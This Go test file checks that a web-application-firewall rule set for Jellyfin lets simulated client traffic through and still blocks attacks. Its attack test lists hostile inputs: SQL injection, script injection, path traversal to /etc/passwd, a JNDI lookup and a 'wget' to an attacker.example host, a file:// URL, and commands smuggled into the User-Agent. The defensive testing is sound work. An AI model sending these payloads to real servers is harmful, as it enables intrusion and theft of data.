package services

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/rforced/ostiole/internal/model"
)

// jf makes what Jellyfin's clients send, from a seed: the web client, the
// Android TV client, the Roku client and a client built on the Kotlin SDK
// whose name begins like the who command, with the shapes a capture of a
// server in use and a router's log showed. Names and ids are made up.
type jf struct{ vw }

// id is a Jellyfin id as the server writes it: a GUID's 32 hex digits.
func (g jf) id() string { return hex.EncodeToString(g.bytes(16)) }

func (g jf) ticks() string { return strconv.FormatInt(g.r.Int64N(1e11), 10) }

// jfClient is one client's way of asking.
type jfClient struct {
	userAgent, auth, deviceID string
	accept                    bool   // sends an Accept header with media requests
	dashedIDs                 bool   // writes item ids with dashes
	prefs                     string // the name it keeps display settings under, where seen
}

// jfClients is how many clients client knows.
const jfClients = 4

// client is client n's way of asking, n from 0 to jfClients-1.
func (g jf) client(n int) jfClient {
	token := g.id()
	switch n {
	case 0:
		ua := fmt.Sprintf("Mozilla/5.0 (X11; Linux x86_64; rv:%d.0) Gecko/20100101 Firefox/%d.0", 120+g.r.IntN(40), 120+g.r.IntN(40))
		// The web client's device id is its user agent and the time it
		// first ran, in base64 with the padding made 1s.
		dev := strings.ReplaceAll(base64.StdEncoding.EncodeToString(
			[]byte(ua+"|"+strconv.FormatInt(1600000000000+g.r.Int64N(2e11), 10))), "=", "1")
		return jfClient{ua, fmt.Sprintf(`MediaBrowser Client="Jellyfin%%20Web", Device="Firefox", DeviceId="%s", Version="10.11.%d", Token="%s"`,
			dev, g.r.IntN(9), token), dev, true, false, "emby"}
	case 1:
		// The Kotlin SDK encodes its values as a form does.
		dev := hex.EncodeToString(g.bytes(20))
		name := url.QueryEscape(g.pick("Front Room TV", "Sam's TV (2)", "Attic Fire TV", "Büro", "LOFT Android TV"))
		return jfClient{"Jellyfin Android TV/0.19.10 via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
			fmt.Sprintf(`MediaBrowser Client="Jellyfin+Android+TV", Version="0.19.10", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
			dev, false, true, ""}
	case 2:
		dev := g.uuid() + g.pick("", "sam", "kitchen")
		return jfClient{"Roku/DVP-15.0 (15.0.4.2001-CG)",
			fmt.Sprintf(`MediaBrowser Client="Jellyfin Roku", Device="%s", Version="3.2.3", UserId="%s", DeviceId="%s", Token="%s"`,
				g.pick("50K410 (Z000X)", "Roku Ultra", "Streaming Stick 4K"), g.id(), dev, token), dev, false, false, ""}
	default:
		dev := hex.EncodeToString(g.bytes(8))
		name := url.QueryEscape(g.pick("Den TV", "Sam's TV (2)"))
		return jfClient{"Whorlix/1.4.2-0-g3c1d2e0a via jellyfin-sdk-kotlin (OkHttp/4.12.0)",
			fmt.Sprintf(`MediaBrowser Client="Whorlix", Version="1.4.2-0-g3c1d2e0a", DeviceId="%s", Device="%s", Token="%s"`, dev, name, token),
			dev, false, true, "Whorlix"}
	}
}

// jfRequest is one request of a client's.
type jfRequest struct {
	method, path, contentType, body string
	media                           bool // a stream or an image: no Accept from most players, and Range to seek
	client                          jfClient
}

// jfSearches are things people type to find a film, a show or a song. The
// last three are titles paranoia 3 alone refuses: a shell word after a
// question, the shell's history in "!!", a word in quotes.
var jfSearches = []string{"the night ferry", "Kite-Girl: Beyond the Kite-Line", "Hélène", "空と海の約束",
	"Salt & Pepper: Night Kitchen Unit", "(300) Nights of Winter", "Dancin' on the Pier", "Harbour: Unfinished – Low Tide",
	"ROV·R", "Rosémon", "B*R*I*G", "Who's Minding the Lighthouse?", "There Goes the Last Train!!", "Rollin' for a Stolen'"}

func (g jf) search() string { return g.pick(jfSearches...) }

// password is one a password manager made.
func (g jf) password() string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?`~|\\"
	b := make([]byte, 12+g.r.IntN(20))
	for i := range b {
		b[i] = chars[g.r.IntN(len(chars))]
	}
	return string(b)
}

// profile is a device profile, which a client sends to be told how it can
// play an item.
func (g jf) profile() map[string]any {
	cond := func(prop, value string) map[string]any {
		return map[string]any{"Condition": g.pick("LessThanEqual", "EqualsAny", "NotEquals"), "Property": prop, "Value": value, "IsRequired": false}
	}
	return map[string]any{
		"Name": g.pick("AndroidTV-Default", "Jellyfin Web"), "MaxStreamingBitrate": 120000000, "MaxStaticBitrate": 100000000,
		"MusicStreamingTranscodingBitrate": 384000,
		"DirectPlayProfiles": []any{
			map[string]any{"Container": "mp4,m4v,mkv,webm", "Type": "Video", "VideoCodec": "h264,hevc,vp9,av1", "AudioCodec": "aac,aac_latm,ac3,alac,dca,dts,eac3,flac,mp3,opus,pcm_alaw,pcm_mulaw,truehd,vorbis"},
			map[string]any{"Container": "mp3", "Type": "Audio"},
		},
		"TranscodingProfiles": []any{map[string]any{"Container": "mp4", "Type": "Video", "AudioCodec": "aac,mp3", "VideoCodec": "h264,hevc",
			"Context": "Streaming", "Protocol": "hls", "MaxAudioChannels": "6", "MinSegments": "1", "BreakOnNonKeyFrames": true}},
		"CodecProfiles": []any{
			map[string]any{"Type": "Video", "Codec": "h264", "Conditions": []any{cond("VideoProfile", "high|main|baseline|constrained baseline"), cond("VideoLevel", "52")}},
			map[string]any{"Type": "Video", "Codec": "hevc", "Conditions": []any{cond("VideoProfile", "main|main 10"), cond("VideoRangeType", "SDR|HDR10|HDR10Plus|HLG")}},
			map[string]any{"Type": "Video", "Codec": "hevc", "ApplyConditions": []any{cond("VideoRangeType", "DOVIInvalid|DOVIWithEL|DOVIWithHDR10Plus|DOVIWithELHDR10Plus")},
				"Conditions": []any{cond("IsInterlaced", "false")}},
		},
		"ResponseProfiles": []any{map[string]any{"Type": "Video", "Container": "m4v", "MimeType": "video/mp4"}},
		"SubtitleProfiles": []any{map[string]any{"Format": "vtt", "Method": "External"}, map[string]any{"Format": "ass", "Method": "Encode"}},
	}
}

func (g jf) progress(c jfClient) map[string]any {
	item := g.id()
	if c.dashedIDs {
		item = g.uuid()
	}
	queue := []any{}
	for i := range 1 + g.r.IntN(3) {
		queue = append(queue, map[string]any{"Id": g.id(), "PlaylistItemId": "playlistItem" + strconv.Itoa(i)})
	}
	return map[string]any{
		"VolumeLevel": 100, "IsMuted": false, "IsPaused": g.r.IntN(4) == 0, "RepeatMode": "RepeatNone", "ShuffleMode": "Sorted",
		"MaxStreamingBitrate": 140000000, "PositionTicks": g.r.Int64N(1e11), "PlaybackStartTimeTicks": g.r.Int64N(1e18),
		"PlaybackRate": 1, "SubtitleStreamIndex": -1, "AudioStreamIndex": 1,
		"BufferedRanges": []any{map[string]any{"start": 0, "end": g.r.Float64() * 1e10}}, "PlayMethod": g.pick("DirectPlay", "Transcode"),
		"PlaySessionId": g.id(), "PlaylistItemId": "playlistItem0", "MediaSourceId": g.id(), "CanSeek": true, "ItemId": item,
		"EventName": g.pick("timeupdate", "pause", "unpause"), "NowPlayingQueue": queue,
	}
}

// requests is one of everything the clients were seen to send, and the
// everyday ones a capture of an evening missed, as c sends them.
func (g jf) requests(c jfClient) []jfRequest {
	const js = "application/json"
	user, item, source, session := g.id(), g.id(), g.id(), g.id()
	stream := fmt.Sprintf("DeviceId=%s&MediaSourceId=%s&VideoCodec=av1,hevc,h264&AudioCodec=aac,opus,flac&AudioStreamIndex=1"+
		"&VideoBitrate=139616000&AudioBitrate=384000&MaxFramerate=23.976025&api_key=%s&PlaySessionId=%s&TranscodingMaxAudioChannels=2"+
		"&RequireAvc=false&EnableAudioVbrEncoding=true&Tag=%s&SegmentContainer=mp4&MinSegments=1&BreakOnNonKeyFrames=True&h264-level=40"+
		"&h264-videobitratemax=139616000&h264-profile=%s&hevc-profile=main10&av1-rangetype=SDR,HDR10,HLG&TranscodeReasons=ContainerNotSupported,AudioCodecNotSupported",
		c.deviceID, source, g.id(), session, g.id(), g.pick("high,main,baseline,constrainedbaseline", "high,main,baseline,constrainedbaseline,high10"))
	fields := "fields=PrimaryImageAspectRatio&fields=MediaSourceCount&fields=Overview&enableImageTypes=Primary&enableImageTypes=Backdrop&enableImageTypes=Thumb"
	prefs := map[string]any{"Id": g.uuid(), "SortBy": "SortName", "RememberIndexing": false, "PrimaryImageHeight": 250, "PrimaryImageWidth": 250,
		"ScrollDirection": "Horizontal", "ShowBackdrop": true, "RememberSorting": false, "SortOrder": "Ascending", "ShowSidebar": false, "Client": "emby",
		"CustomPrefs": map[string]any{"homesection0": "resume", "homesection1": "nextup", "skipForwardLength": "30000", "enableNextVideoInfoOverlay": "True",
			"tvhome": "", g.id() + "-series": `{"SortBy":"SortName","SortOrder":"Ascending"}`, g.id() + "-series-_view": "PosterCard",
			g.id() + "-movies": `{"SortBy":"PlayCount,SortName,ProductionYear","SortOrder":"Descending"}`, "subtitleeditor-language": "eng"}}
	rs := []jfRequest{
		{"GET", "/System/Info/Public", "", "", false, c},
		{"GET", "/web/config.json", "", "", false, c},
		{"GET", "/web/main.jellyfin.bundle.js?" + g.id()[:20], "", "", false, c},
		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": g.pick("sam", "Jane Doe", "José"), "Pw": g.password()}), false, c},
		{"POST", "/Users/" + user + "/Password", js, vwJSON(map[string]any{"CurrentPw": g.password(), "NewPw": g.password()}), false, c},
		{"POST", "/QuickConnect/Authorize?code=" + fmt.Sprintf("%06d", g.r.IntN(1e6)) + "&userId=" + user, "", "", false, c},
		{"GET", "/socket?api_key=" + g.id() + "&deviceId=" + c.deviceID, "", "", false, c},
		{"POST", "/Sessions/Capabilities/Full", js, vwJSON(map[string]any{"PlayableMediaTypes": []string{"Audio", "Video"},
			"SupportedCommands":    []string{"MoveUp", "MoveDown", "DisplayContent", "SetSubtitleStreamIndex", "PlayMediaSource"},
			"SupportsMediaControl": true, "SupportsPersistentIdentifier": false, "DeviceProfile": g.profile()}), false, c},
		{"GET", "/UserViews?userId=" + user, "", "", false, c},
		{"GET", "/Users/" + user + "/Items?SortBy=SortName,ProductionYear&SortOrder=Ascending&IncludeItemTypes=Movie&Recursive=true" +
			"&Fields=PrimaryImageAspectRatio,MediaSourceCount&ImageTypeLimit=1&EnableImageTypes=Primary,Backdrop,Banner,Thumb&StartIndex=0&ParentId=" +
			g.id() + "&Limit=100", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&" + fields + "&includeItemTypes=Series&recursive=true&limit=24", "", "", false, c},
		{"GET", "/Items/Latest?userId=" + user + "&limit=16&" + fields + "&parentId=" + g.id() + "&imageTypeLimit=1&groupItems=true", "", "", false, c},
		{"GET", "/Shows/NextUp?userId=" + user + "&" + fields + "&limit=24&nextUpDateCutoff=" + time.Unix(1.7e9+g.r.Int64N(1e8), 0).UTC().Format("2006-01-02") +
			"&enableTotalRecordCount=false&disableFirstEpisode=false&enableResumable=false&enableRewatching=false", "", "", false, c},
		{"GET", "/UserItems/Resume?userId=" + user + "&" + fields + "&mediaTypes=Video&limit=12", "", "", false, c},
		{"GET", "/Shows/" + item + "/Episodes?seasonId=" + g.id() + "&userId=" + user + "&Fields=ItemCounts,PrimaryImageAspectRatio,Overview", "", "", false, c},
		{"GET", "/MediaSegments/" + item + "?includeSegmentTypes=Intro&includeSegmentTypes=Outro", "", "", false, c},
		{"GET", "/System/ActivityLog/Entries?startIndex=0&limit=7&minDate=" + g.date() + "&hasUserId=false", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&searchTerm=" + url.QueryEscape(g.search()) + "&" + fields + "&recursive=true&limit=24", "", "", false, c},
		{"GET", "/Items?userId=" + user + "&genres=" + url.QueryEscape(g.pick("Sci-Fi & Fantasy", "Action|Comedy", "Animation")) +
			"&studios=" + url.QueryEscape(g.pick("B12", "Studio Kestrel", "Harbour Bros. Pictures")) + "&officialRatings=PG-13&recursive=true", "", "", false, c},
		{"GET", "/Items/" + item + "/Images/Primary?fillHeight=446&fillWidth=298&quality=96&tag=" + g.id(), "", "", true, c},
		{"GET", "/Items/" + item + "/Images/Backdrop/0?tag=" + g.id() + "&maxWidth=1920&quality=80", "", "", true, c},
		{"POST", "/Items/" + item + "/PlaybackInfo?UserId=" + user + "&StartTimeTicks=" + g.ticks() + "&IsPlayback=true&AutoOpenLiveStream=true" +
			"&AudioStreamIndex=1&MediaSourceId=" + source + "&MaxStreamingBitrate=140000000", js,
			vwJSON(map[string]any{"DeviceProfile": g.profile(), "AlwaysBurnInSubtitleWhenTranscoding": false}), false, c},
		{"GET", "/Videos/" + item + "/stream?static=true&mediaSourceId=" + source + "&deviceId=" + c.deviceID + "&api_key=" + g.id() + "&Tag=" + g.id() + "&streamOptions={}", "", "", true, c},
		{"GET", "/videos/" + item + "/master.m3u8?" + stream, "", "", true, c},
		{"GET", "/videos/" + item + "/hls1/main/" + strconv.Itoa(g.r.IntN(900)) + ".mp4?" + stream + "&runtimeTicks=" + g.ticks() + "&actualSegmentLengthTicks=" + g.ticks(), "", "", true, c},
		{"GET", "/Videos/" + item + "/" + item + "/Subtitles/" + strconv.Itoa(g.r.IntN(9)) + "/0/Stream.ass?api_key=" + g.id(), "", "", true, c},
		{"GET", "/Audio/" + item + "/universal?UserId=" + user + "&DeviceId=" + c.deviceID + "&MaxStreamingBitrate=140000000" +
			"&Container=opus,webm|opus,ts|mp3,mp3,aac,m4a|aac,m4b|aac,flac,webma,webm|webma,wav,ogg&TranscodingContainer=mp4&TranscodingProtocol=hls" +
			"&AudioCodec=aac&api_key=" + g.id() + "&PlaySessionId=" + session + "&StartTimeTicks=0&EnableRedirection=true&EnableRemoteMedia=false", "", "", true, c},
		{"GET", "/Items/" + item + "/Download?api_key=" + g.id(), "", "", true, c},
		{"POST", "/Sessions/Playing", js, vwJSON(g.progress(c)), false, c},
		{"POST", "/Sessions/Playing/Progress", js, vwJSON(g.progress(c)), false, c},
		{"POST", "/Sessions/Playing/Stopped", js, vwJSON(map[string]any{"ItemId": g.id(), "MediaSourceId": source, "PositionTicks": g.r.Int64N(1e11),
			"PlaySessionId": session, "Failed": false, "NowPlayingQueue": []any{}}), false, c},
		{"POST", "/Sessions/Playing/Ping?playSessionId=" + session, "", "", false, c},
		{"POST", "/UserFavoriteItems/" + item, "", "", false, c},
		{"DELETE", "/UserFavoriteItems/" + item, "", "", false, c},
		{"POST", "/UserPlayedItems/" + item + "?datePlayed=" + url.QueryEscape(g.date()), "", "", false, c},
		{"DELETE", "/UserPlayedItems/" + item, "", "", false, c},
		{"POST", "/UserItems/" + item + "/Rating?likes=true", "", "", false, c},
		{"DELETE", "/UserItems/" + item + "/Rating", "", "", false, c},
		{"POST", "/DisplayPreferences/usersettings?userId=" + user + "&client=emby", js, vwJSON(prefs), false, c},
		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": g.pick("Road trip", "Kids' films", "Sunday (slow)", "Musique d'été"),
			"Ids": []string{g.id(), g.id()}, "UserId": user, "MediaType": "Audio"}), false, c},
		{"DELETE", "/Playlists/" + item + "/Items?entryIds=" + g.id() + "," + g.id(), "", "", false, c},
		{"POST", "/SyncPlay/New", js, vwJSON(map[string]any{"GroupName": g.pick("Movie night", "Sam's room")}), false, c},
		{"POST", "/SyncPlay/Buffering", js, vwJSON(map[string]any{"When": g.date(), "PositionTicks": g.r.Int64N(1e11), "IsPlaying": true,
			"PlaylistItemId": g.uuid()}), false, c},
		// The web client sends its log as text; one seen on a router came
		// as a form.
		{"POST", "/ClientLog/Document", g.pick("text/plain", "application/x-www-form-urlencoded"), "[2026-09-28T21:04:31.000Z] TypeError: Cannot read properties of undefined (reading 'Id')\n" +
			"    at Object.<anonymous> (https://watch.example.com/web/main.jellyfin.bundle.js:2:34567)\n    at x.play (playbackmanager.js:1:2)\n", false, c},
		{"POST", "/Items/RemoteSearch/Series", js, vwJSON(map[string]any{"SearchInfo": map[string]any{"Name": g.pick("Lanternfall", "Paper Harbour"),
			"Year": 2019, "ProviderIds": map[string]any{"Tvdb": "", "Imdb": "", "Tmdb": ""}}, "ItemId": item, "IncludeDisabledProviders": true}), false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + item + "?ReplaceAllImages=true", js, vwJSON(map[string]any{"Name": "Lanternfall (2019)",
			"ProviderIds": map[string]any{"AniDB": "14000"}, "ProductionYear": 2019, "PremiereDate": "2019-04-05T00:00:00.0000000Z",
			"ImageUrl": "https://cdn.example.org/images/main/" + strconv.Itoa(g.r.IntN(1e6)) + ".jpg", "SearchProviderName": "AniDB"}), false, c},
		{"POST", "/Items/" + item + "/Refresh?Recursive=true&ImageRefreshMode=Default&MetadataRefreshMode=Default&ReplaceAllImages=false" +
			"&RegenerateTrickplay=false&ReplaceAllMetadata=false", "", "", false, c},
	}
	if c.prefs != "" {
		rs = append(rs, jfRequest{"GET", "/DisplayPreferences/" + g.pick("default", "usersettings") + "?userId=" + g.uuid() + "&client=" + c.prefs, "", "", false, c})
	}
	return rs
}

// jfSend sends r to the Jellyfin site at addr as r's client does, and
// returns the status.
func jfSend(t *testing.T, addr string, r jfRequest) int {
	t.Helper()
	tr := &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, addr)
	}}
	defer tr.CloseIdleConnections()
	req, err := http.NewRequestWithContext(t.Context(), r.method, "http://watch.example.com"+r.path, strings.NewReader(r.body))
	if err != nil {
		t.Fatal(err)
	}
	if r.contentType != "" {
		req.Header.Set("Content-Type", r.contentType)
	}
	if !r.media || r.client.accept {
		req.Header.Set("Accept", "application/json")
	}
	if r.media {
		req.Header.Set("Range", "bytes=0-")
	}
	req.Header.Set("Authorization", r.client.auth)
	req.Header.Set("User-Agent", r.client.userAgent)
	resp, err := (&http.Client{Transport: tr, Timeout: 10 * time.Second}).Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", r.method, r.path, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// watchSite runs the sidecar with one Jellyfin site at paranoia pl,
// blocking, with the set loaded or not.
func watchSite(t *testing.T, pl int, set bool) (string, *lockedBuffer) {
	t.Helper()
	profile := model.WAFProfile{ID: "watch", Mode: "block", Paranoia: pl}
	if set {
		profile.Applications = []string{"jellyfin"}
	}
	cfg := &model.Config{}
	cfg.Services.Proxy = model.Proxy{
		Enabled: true, HTTPPort: freePort(t), HTTPSPort: freePort(t),
		Pools:    []model.ProxyPool{{ID: "jellyfin", Upstreams: []model.ProxyUpstream{{Address: answer(t, "{}")}}}},
		Profiles: []model.WAFProfile{profile},
		Sites: []model.ProxySite{{ID: "watch", Enabled: true, Hosts: []string{"watch.example.com"}, Pool: "jellyfin",
			PlainHTTP: true, WAF: "watch"}},
	}
	plain, _, out := runSidecar(t, sidecar(t), cfg, "", map[string][]string{model.SelfCertificate: {"127.0.0.1"}})
	return plain, out
}

// What Jellyfin's clients send passes at every paranoia level with the set
// loaded, where at paranoia 4 without it nearly every request is refused.
func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
	t.Parallel()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := watchSite(t, pl, true)
			g := jf{vw{rand.New(rand.NewPCG(uint64(pl), 2))}}
			for _, term := range jfSearches {
				r := jfRequest{"GET", "/Items?userId=" + g.id() + "&searchTerm=" + url.QueryEscape(term) + "&recursive=true", "", "", false, g.client(g.r.IntN(jfClients))}
				if status := jfSend(t, plain, r); status != http.StatusOK {
					t.Errorf("a search for %q: %d", term, status)
				}
			}
			for i := range 2 * jfClients {
				for _, r := range g.requests(g.client(i % jfClients)) {
					if status := jfSend(t, plain, r); status != http.StatusOK {
						t.Errorf("%s %s (%s): %d", r.method, r.path, r.client.userAgent, status)
					}
				}
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// An attack CRS alone refuses at a level is refused with the set loaded
// too, whether it sits in an argument the clients fill with ids and lists
// or comes in the Authorization header. Text, which the set reads as
// paranoia 2 does, keeps what CRS alone refuses there.
func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
	t.Parallel()
	g := jf{vw{rand.New(rand.NewPCG(7, 8))}}
	c := g.client(0)
	kt := g.client(jfClients - 1)
	ua := func(userAgent string) jfClient {
		k := kt
		k.userAgent = userAgent
		return k
	}
	const js = "application/json"
	progress := func(field, value string) string {
		p := g.progress(c)
		p[field] = value
		return vwJSON(p)
	}
	inText := []jfRequest{
		{"GET", "/Items?searchTerm=" + url.QueryEscape("x' UNION SELECT Password FROM Users--") + "&recursive=true", "", "", false, c},
		{"GET", "/Items?searchTerm=" + url.QueryEscape("<script>alert(document.cookie)</script>"), "", "", false, c},
		{"GET", "/Items?searchTerm=" + url.QueryEscape("; cat /etc/passwd"), "", "", false, c},
		{"GET", "/Items?genres=" + url.QueryEscape("${jndi:ldap://attacker.example/a}"), "", "", false, c},
		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": "<script>alert(1)</script>", "Ids": []string{g.id()}}), false, c},
		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c},
	}
	attacks := []jfRequest{
		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
		{"GET", "/Items/" + g.id() + "/Images/Primary?tag=" + url.QueryEscape("<svg onload=alert(1)>"), "", "", true, c},
		{"GET", "/videos/" + g.id() + "/master.m3u8?DeviceId=" + url.QueryEscape("../../../../etc/passwd") + "&api_key=" + g.id(), "", "", true, c},
		{"GET", "/Shows/NextUp?nextUpDateCutoff=" + url.QueryEscape("2025-09-29' AND SLEEP(5)--"), "", "", false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("ItemId", "1; wget http://attacker.example/x.sh"), false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c},
		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c},
		{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, ""}},
		// A command after the client's name. After a closing bracket only
		// the check the set lifts off a plain User-Agent reads it.
		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + ";wget")},
		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + " `id`")},
		// Without a character only the rules that count them see. Where
		// the clients send ids and lists these are marked, and read as CRS
		// reads them.
		{"GET", "/Items?fields=" + url.QueryEscape("1 or 1") + "&recursive=true", "", "", false, c},
		{"GET", "/Items?fields=" + url.QueryEscape("char(65)"), "", "", false, c},
		{"GET", "/Items?parentId=" + url.QueryEscape("a);(b"), "", "", false, c},
		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "((((((((("), false, c},
		{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c},
		// Outside the arguments the set knows, text is read as CRS reads it.
		{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c},
	}
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			bare, _ := watchSite(t, pl, false)
			bareText := bare
			if pl > 2 {
				bareText, _ = watchSite(t, 2, false)
			}
			plain, out := watchSite(t, pl, true)
			refused := 0
			check := func(bare string, rs []jfRequest) {
				for _, r := range rs {
					if jfSend(t, bare, r) != http.StatusForbidden {
						continue
					}
					refused++
					if status := jfSend(t, plain, r); status != http.StatusForbidden {
						t.Errorf("%s %s with %.80q (%s): %d with the set, 403 without", r.method, r.path, r.body+r.client.auth, r.client.userAgent, status)
					}
				}
			}
			check(bare, attacks)
			check(bareText, inText)
			if total := len(attacks) + len(inText); refused < total/2 {
				t.Errorf("CRS alone refused only %d of %d attacks", refused, total)
			}
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}
